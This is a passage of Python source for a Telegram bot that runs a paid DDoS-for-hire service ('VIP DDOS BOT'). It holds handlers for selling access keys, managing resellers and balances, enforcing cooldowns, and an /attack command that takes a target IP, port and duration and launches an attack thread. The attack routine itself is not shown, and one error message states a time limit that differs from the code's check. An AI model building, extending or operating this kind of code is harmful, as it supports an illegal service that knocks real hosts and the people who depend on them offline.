            f"<i>Check keys.json or regenerate the key.</i>\n"
            f"━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Key: {key_name}", response)
        with open(BLOCK_ERROR_LOG, "a") as log_file:
            log_file.write(f"Attempt to block {key_name} at {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')} failed. Available keys: {list(keys.keys())}\n")
    save_data()

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["add"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_admin(user_id, username):
        response = "🚫 <b>Access Denied:</b> <i>Admin only command</i> 🚫\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = (
            f"📋 <b>Usage:</b> <i>/add &lt;user_id&gt;</i>\n"
            f"<b>Example:</b> <i>/add 1807014348</i> 📋\n"
            f"━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return
    target_user_id = command_parts[1]
    if target_user_id in authorized_users:
        response = f"✅ <b>User {target_user_id} is already authorized!</b> <i>No need to add again</i> ✅\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Target User ID: {target_user_id}", response)
        return
    expiration_time = add_time_to_current_date(months=1)
    authorized_users[target_user_id] = {"expiration": expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'), "context": "both"}
    stats["total_users"].add(target_user_id)
    save_data()
    response = (
        f"🎉 <b>User {target_user_id} added successfully!</b> 🎉\n"
        f"<b>Access until:</b> <i>{expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}</i>\n"
        f"<b>Context:</b> <i>both group and private</i>\n"
        f"━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/add", f"Target User ID: {target_user_id}, Expiration: {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}", response)

@bot.message_handler(commands=['logs'])
def send_logs(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    chat_id = message.chat.id
    is_group = message.chat.type in ['group', 'supergroup']
    is_dm = message.chat.type == 'private'

    if not is_overlord(user_id, username):
        response = "🚫 <b>Access Denied</b>\n<i>Only Overlord can view logs</i>"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/logs", "", response)
        return

    try:
        with open(LOG_FILE, "rb") as file:
            if is_dm:
                # If command used in bot DM, send only once there
                bot.send_document(chat_id, file, caption="🧾 <b>Here are the logs:</b>", parse_mode="HTML")
            elif is_group:
                # If used in group, send in group AND once to overlord DM
                bot.send_document(chat_id, file, caption="🧾 <b>Logs sent in group</b>", parse_mode="HTML")
                bot.send_document(user_id, file, caption="🧾 <b>Group requested logs:</b>", parse_mode="HTML")
        log_action(user_id, username, "/logs", f"Sent logs from {'group' if is_group else 'DM'}", "Success")
    except Exception as e:
        error_msg = f"❌ Failed to send logs: {str(e)}"
        safe_reply(bot, message, error_msg)
        log_action(user_id, username, "/logs", "", error_msg)
        
@bot.message_handler(commands=['users'])
def list_users(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["users"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_admin(user_id, username):
        response = "🚫 <b>Access Denied:</b> <i>Admin only command</i> 🚫\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/users", f"Command: {command}", response)
        return
    response = "👥 <b>Authorized Users List</b> 👥\n"
    if not authorized_users:
        response += "<i>No authorized users found.</i>\n"
    else:
        for uid, info in authorized_users.items():
            response += (
                f"<b>User ID:</b> <i>{uid}</i>\n"
                f"<b>Expiration:</b> <i>{info['expiration']}</i>\n"
                f"<b>Context:</b> <i>{info['context'].capitalize()}</i>\n\n"
            )
    response += "━━━━━━━"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/users", "", response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["remove"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_admin(user_id, username):
        response = "🚫 <b>Access Denied:</b> <i>Admin only command</i> 🚫\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = (
            f"📋 <b>Usage:</b> <i>/remove <user_id></i>\n"
            f"<b>Example:</b> <i>/remove 1807014348</i> 📋\n"
            f"━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Command: {command}", response)
        return
    target_user_id = command_parts[1]
    if target_user_id not in authorized_users and target_user_id not in users:
        response = f"❌ <b>User {target_user_id} not found!</b> <i>Nothing to remove</i> ❌\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Target User ID: {target_user_id}", response)
        return
    if target_user_id in authorized_users:
        del authorized_users[target_user_id]
    if target_user_id in users:
        del users[target_user_id]
        # Remove user from any key's device list
        for key, info in keys.items():
            if target_user_id in info["devices"]:
                info["devices"].remove(target_user_id)
    save_data()
    response = f"🗑️ <b>User {target_user_id} removed successfully!</b> 🗑️\n━━━━━━━"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/remove", f"Target User ID: {target_user_id}", response)

@bot.message_handler(commands=['resellers'])
def list_resellers(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["resellers"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    response = "💰 <b>Resellers List</b> 💰\n"
    if not resellers:
        response += "<i>No resellers found.</i>\n"
    else:
        for rid, balance in resellers.items():
            response += (
                f"<b>Reseller ID:</b> <i>{rid}</i>\n"
                f"<b>Balance:</b> <i>{balance} Rs 💰</i>\n\n"
            )
    response += "━━━━━━━"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/resellers", "", response)

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["addbalance"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_admin(user_id, username):
        response = "🚫 <b>Access Denied:</b> <i>Admin only command</i> 🚫\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        response = (
            f"📋 <b>Usage:</b> <i>/addbalance <reseller_id> <amount></i>\n"
            f"<b>Example:</b> <i>/addbalance 1807014348 500</i> 📋\n"
            f"━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Command: {command}", response)
        return
    reseller_id = command_parts[1]
    try:
        amount = int(command_parts[2])
        if amount <= 0:
            response = "❌ <b>Invalid amount!</b> <i>Amount must be greater than 0.</i> ❌\n━━━━━━━"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addbalance", f"Reseller ID: {reseller_id}, Amount: {amount}", response)
            return
    except ValueError:
        response = "❌ <b>Invalid amount!</b> <i>Please enter a valid number.</i> ❌\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Reseller ID: {reseller_id}, Amount: {command_parts[2]}", response)
        return
    if reseller_id not in resellers:
        response = f"❌ <b>Reseller {reseller_id} not found!</b> <i>Add them first using /addreseller.</i> ❌\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Reseller ID: {reseller_id}, Amount: {amount}", response)
        return
    resellers[reseller_id] += amount
    save_data()
    response = (
        f"💰 <b>Balance added successfully!</b> 💰\n"
        f"<b>Reseller ID:</b> <i>{reseller_id}</i>\n"
        f"<b>Added Amount:</b> <i>{amount} Rs</i>\n"
        f"<b>New Balance:</b> <i>{resellers[reseller_id]} Rs 💰</i>\n"
        f"━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addbalance", f"Reseller ID: {reseller_id}, Amount: {amount}, New Balance: {resellers[reseller_id]}", response)

@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["removereseller"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_admin(user_id, username):
        response = "🚫 <b>Access Denied:</b> <i>Admin only command</i> 🚫\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = (
            f"📋 <b>Usage:</b> <i>/removereseller <reseller_id></i>\n"
            f"<b>Example:</b> <i>/removereseller 1807014348</i> 📋\n"
            f"━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Command: {command}", response)
        return
    reseller_id = command_parts[1]
    if reseller_id not in resellers:
        response = f"❌ <b>Reseller {reseller_id} not found!</b> <i>Nothing to remove</i> ❌\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Reseller ID: {reseller_id}", response)
        return
    del resellers[reseller_id]
    save_data()
    response = f"🗑️ <b>Reseller {reseller_id} removed successfully!</b> 🗑️\n━━━━━━━"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/removereseller", f"Reseller ID: {reseller_id}", response)

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["setcooldown"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_admin(user_id, username):
        response = "🚫 <b>Access Denied:</b> <i>Admin only command</i> 🚫\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = (
            f"📋 <b>Usage:</b> <i>/setcooldown <seconds></i>\n"
            f"<b>Example:</b> <i>/setcooldown 60</i> 📋\n"
            f"━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
        return
    try:
        seconds = int(command_parts[1])
        if seconds < 0:
            response = "❌ <b>Invalid cooldown!</b> <i>Cooldown must be 0 or more seconds.</i> ❌\n━━━━━━━"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/setcooldown", f"Seconds: {command_parts[1]}", response)
            return
        set_cooldown(seconds)
        response = f"⏳ <b>Cooldown set to {seconds} seconds!</b> ⏳\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Seconds: {seconds}", response)
    except ValueError:
        response = "❌ <b>Invalid cooldown value!</b> <i>Please enter a number.</i> ❌\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Seconds: {command_parts[1]}", response)

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["checkcooldown"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    response = f"⏳ <b>Current Cooldown:</b> <i>{COOLDOWN_PERIOD} seconds</i> ⏳\n━━━━━━━"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/checkcooldown", "", response)

@bot.message_handler(commands=['uptime'])
def check_uptime(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["uptime"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    uptime = calculate_uptime()
    response = f"⏳ <b>Bot Uptime:</b> <i>{uptime}</i> ⏳\n━━━━━━━"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/uptime", "", response)

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["attack"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    # Check if user is admin or has valid access
    if not is_admin(user_id, username):
        if user_id not in users and user_id not in authorized_users:
            response = (
                f"🚫 <b>Access Denied:</b> <i>You need a valid key to use this command.</i> 🚫\n"
                f"<b>Buy a key from @Rahul_618 for 50₹.</b> 🔑\n"
                f"━━━━━━━"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/attack", f"Command: {command}", response)
            return
        if user_id in users and not has_valid_context(user_id, chat_type):
            response = f"❌ <b>This key is for {users[user_id]['context'].capitalize()} use only!</b> <i>Use it in a {users[user_id]['context']} chat.</i> ❌\n━━━━━━━"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/attack", f"Command: {command}", response)
            return
        if user_id in authorized_users and authorized_users[user_id]["context"] != "both" and authorized_users[user_id]["context"] != chat_type:
            response = f"❌ <b>Your access is for {authorized_users[user_id]['context'].capitalize()} use only!</b> <i>Use it in a {authorized_users[user_id]['context']} chat.</i> ❌\n━━━━━━━"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/attack", f"Command: {command}", response)
            return

    # Validate command format
    command_parts = message.text.split()
    if len(command_parts) != 4:
        response = (
            f"📋 <b>Usage:</b> <i>/attack IP_ADDRESS PORT TIME</i>\n"
            f"<b>Example:</b> <i>/attack 192.168.1.1 80 120</i> 📋\n"
            f"━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return

    target = command_parts[1]
    try:
        port = int(command_parts[2])
        attack_time = int(command_parts[3])
    except ValueError:
        response = "❌ <b>Invalid port or time!</b> <i>Port and time must be numbers.</i> ❌\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return

    # Validate IP
    ip_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if not ip_pattern.match(target):
        response = "❌ <b>Invalid IP address!</b> <i>Please use a valid IPv4 address (e.g., 192.168.1.1).</i> ❌\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return

    # Validate port
    if port < 1 or port > 65535:
        response = "❌ <b>Invalid port!</b> <i>Port must be between 1 and 65535.</i> ❌\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return

    # Validate time
    if attack_time < 1 or attack_time > 320:
        response = "❌ <b>Invalid attack time!</b> <i>Time must be between 1 and 3600 seconds.</i> ❌\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return

    # Check cooldown
    if user_id in last_attack_time and not is_admin(user_id, username):
        time_since_last_attack = (datetime.datetime.now(IST) - last_attack_time[user_id]).total_seconds()
        if time_since_last_attack < COOLDOWN_PERIOD:
            remaining_time = int(COOLDOWN_PERIOD - time_since_last_attack)
            response = f"⏳ <b>Cooldown active!</b> <i>Please wait {remaining_time} seconds before starting another attack.</i> ⏳\n━━━━━━━"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/attack", f"Command: {command}", response)
            return

    # Execute the attack
    threading.Thread(target=execute_attack, args=(target, port, attack_time, message.chat.id, username, last_attack_time, user_id)).start()

@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["listkeys"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_admin(user_id, username):
        response = "🚫 <b>Access Denied:</b> <i>Admin only command</i> 🚫\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/listkeys", f"Command: {command}", response)
        return
    response = "🔑 <b>All Keys List</b> 🔑\n"
    if not keys:
        response += "<i>No keys found.</i>\n"
    else:
        for key_name, info in keys.items():
            device_limit_display = "Unlimited" if info["device_limit"] == float('inf') else info["device_limit"]
            status = "Blocked 🚫" if info.get("blocked", False) else "Active ✅"
            blocked_by = info.get("blocked_by_username", "N/A")
            blocked_time = info.get("blocked_time", "N/A")
            devices = ", ".join(info["devices"]) if info["devices"] else "None"
            response += (
                f"<b>Key:</b> <code>{key_name}</code>\n"
                f"<b>Duration:</b> <i>{info['duration']}</i>\n"
                f"<b>Device Limit:</b> <i>{device_limit_display}</i>\n"
                f"<b>Devices:</b> <i>{devices}</i>\n"
                f"<b>Status:</b> <i>{status}</i>\n"
            )
            if info.get("blocked", False):
                response += (
                    f"<b>Blocked by:</b> <i>@{blocked_by}</i>\n"
                    f"<b>Blocked on:</b> <i>{blocked_time}</i>\n"
                )
            response += (
                f"<b>Generated by:</b> <i>@{info['generated_by']}</i>\n"
                f"<b>Generated on:</b> <i>{info['generated_time']}</i>\n"
                f"<b>Context:</b> <i>{info['context'].capitalize()} Only!</i>\n\n"
            )
    response += "━━━━━━━"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/listkeys", "", response)

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["myinfo"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    response = f"ℹ️ <b>Your Info</b> ℹ️\n<b>User ID:</b> <i>{user_id}</i>\n<b>Username:</b> <i>@{username}</i>\n"
    
    # Check admin/overlord status
    if is_overlord(user_id, username):
        response += "<b>Role:</b> <i>Overlord 👑</i>\n"
    elif is_admin(user_id, username):
        response += "<b>Role:</b> <i>Admin ✅</i>\n"
    else:
        response += "<b>Role:</b> <i>User</i>\n"
    
    # Check reseller status
    if user_id in resellers:
        response += f"<b>Reseller Balance:</b> <i>{resellers[user_id]} Rs 💰</i>\n"
    
    # Check access status
    if user_id in authorized_users:
        response += (
            f"<b>Access Status:</b> <i>Authorized ✅</i>\n"
            f"<b>Expiration:</b> <i>{authorized_users[user_id]['expiration']}</i>\n"
            f"<b>Context:</b> <i>{authorized_users[user_id]['context'].capitalize()}</i>\n"
        )
    elif user_id in users:
        try:
            expiration_date = datetime.datetime.strptime(users[user_id]['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                response += (
                    f"<b>Access Status:</b> <i>Active Key ✅</i>\n"
                    f"<b>Expiration:</b> <i>{users[user_id]['expiration']}</i>\n"
                    f"<b>Context:</b> <i>{users[user_id]['context'].capitalize()} Only!</i>\n"
                )
            else:
                response += "<b>Access Status:</b> <i>Expired Key ⏳</i>\n"
                del users[user_id]
                save_data()
        except (ValueError, KeyError):
            response += "<b>Access Status:</b> <i>Invalid Key Data</i>\n"
    else:
        response += "<b>Access Status:</b> <i>No Active Key</i>\n"
    
    # Last attack time
    if user_id in last_attack_time:
        response += f"<b>Last Attack:</b> <i>{last_attack_time[user_id].strftime('%Y-%m-%d %I:%M:%S %p')}</i>\n"
    else:
        response += "<b>Last Attack:</b> <i>Never</i>\n"
    
    response += "━━━━━━━"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/myinfo", "", response)

@bot.message_handler(commands=['stats'])
def show_stats(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["stats"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_overlord(user_id, username):
        response = "🚫 <b>Access Denied:</b> <i>Overlord only command</i> 🚫\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/stats", f"Command: {command}", response)
        return
    try:
        # Send initial message
        initial_message = bot.send_message(
            message.chat.id,
            "🌌 <b>Fetching Cosmic Stats...</b> 🌌\n<code>nebula> overlord_stats\nstatus: INITIALIZING 🚀</code>",
            parse_mode="HTML"
        )
        # Start live stats update in a separate thread
        threading.Thread(target=live_stats_update, args=(message.chat.id, initial_message.message_id), daemon=True).start()
        log_action(user_id, username, "/stats", "", "Started live stats update")
    except Exception as e:
        response = f"❌ <b>Error starting stats:</b> <i>{str(e)}</i> ❌\n━━━━━━━"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/stats", "", response, str(e))

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or "Unknown"
    name = message.from_user.first_name or "User"

    stats["command_usage"]["start"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({
        "user_id": user_id,
        "last_active": datetime.datetime.now(IST)
    })
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)

    trial_key = keys.get("trial")
    trial_info = global_data.get("trial_usage", {})
    now = time.time()

    if trial_key and trial_key.get("expiry", 0) > now:
        remaining = int(trial_key["expiry"] - now)
        mins = remaining // 60
        trial_status = (
            f"🧪 <b>Trial Key:</b> <code>Trial</code>\n"
            f"⏳ <b>Status:</b> <span class='tg-spoiler'>Active ({mins} min left)</span>"
        )
    else:
        cooldown = trial_info.get("cooldown_until", 0)
        if now < cooldown:
            cooldown_in = int((cooldown - now) // 3600)
            trial_status = (
                f"⏸️ <b>Trial Cooldown:</b> <span class='tg-spoiler'>{cooldown_in}h left</span>"
            )
        else:
            trial_status = (
                "⚪️ <b>Trial Status:</b> <i>Available — use <b>/trial</b></i>"
            )

    response = (
        f"<u><b>🌌 WELCOME TO VIP DDOS BOT 🌌</b></u>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🙋‍♂️ <b>Hello:</b> <i>{name}</i>\n"
        f"🔗 <b>Username:</b> @{username}\n"
        f"🆔 <b>User ID:</b> <code>{user_id}</code>\n\n"
        f"🧪 <b>Trial Access:</b>\n{trial_status}\n\n"
        f"<b>📖 Available Commands:</b>\n"
        f"├─ 🆘 <b>/help</b> — Show all commands\n"
        f"├─ 🧪 <b>/trial</b> — 1-hour trial key\n"
        f"└─ ℹ️ <b>/myinfo</b> — Your key info\n\n"
        f"🔑 <b>Buy Key:</b> <a href='https://t.me/Rahul_618'>@Rahul_618</a>\n"
        f"📩 <b>Support:</b> <a href='https://t.me/Rahul_618'>@Rahul_618</a>\n"
        f"🌐 <b>Join Channel:</b> <a href='https://t.me/devil_ddos'>DEVIL DDOS</a>\n"
        f"━━━━━━━━━━━━━━━━━━━"
    )

    safe_reply(bot, message, response)
    log_action(user_id, username, "/start", "", response)

# Load data on startup
load_data()

# Periodic backup task
def periodic_backup():
    while True:
        create_backup()
        time.sleep(3600)  # Backup every hour

# Start periodic backup in a separate thread
threading.Thread(target=periodic_backup, daemon=True).start()

# Shutdown function to save data and log exit
def shutdown_bot():
    save_data()  # Save all data before shutting down
    log_action("SYSTEM", "SYSTEM", "Bot Shutdown", "", "Bot stopped via Ctrl+C")
    print("Bot stopped gracefully! 💤")
    bot.stop_polling()  # Stop the bot polling

def log_system_message(text):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] SYSTEM | SYNTAX | {text}\n")

try:
    subprocess.run(["python3", "-m", "py_compile", "Rohan.py"], check=True)
    print("✅ Syntax check passed.")
    log_system_message("✅ Syntax check passed. Bot ready to start.")
except subprocess.CalledProcessError:
    error_text = "❌ Syntax error found. Bot stopped."
    print(error_text)
    log_system_message(error_text)
    exit()
    
initialize_system()
loop = asyncio.get_event_loop()
loop.create_task(auto_cleanup())

# Start the bot
print("Bot started successfully! 🚀")
log_action("SYSTEM", "SYSTEM", "Bot Start", "", "Bot started successfully")

try:
    bot.polling(none_stop=True)
except KeyboardInterrupt:
    shutdown_bot()
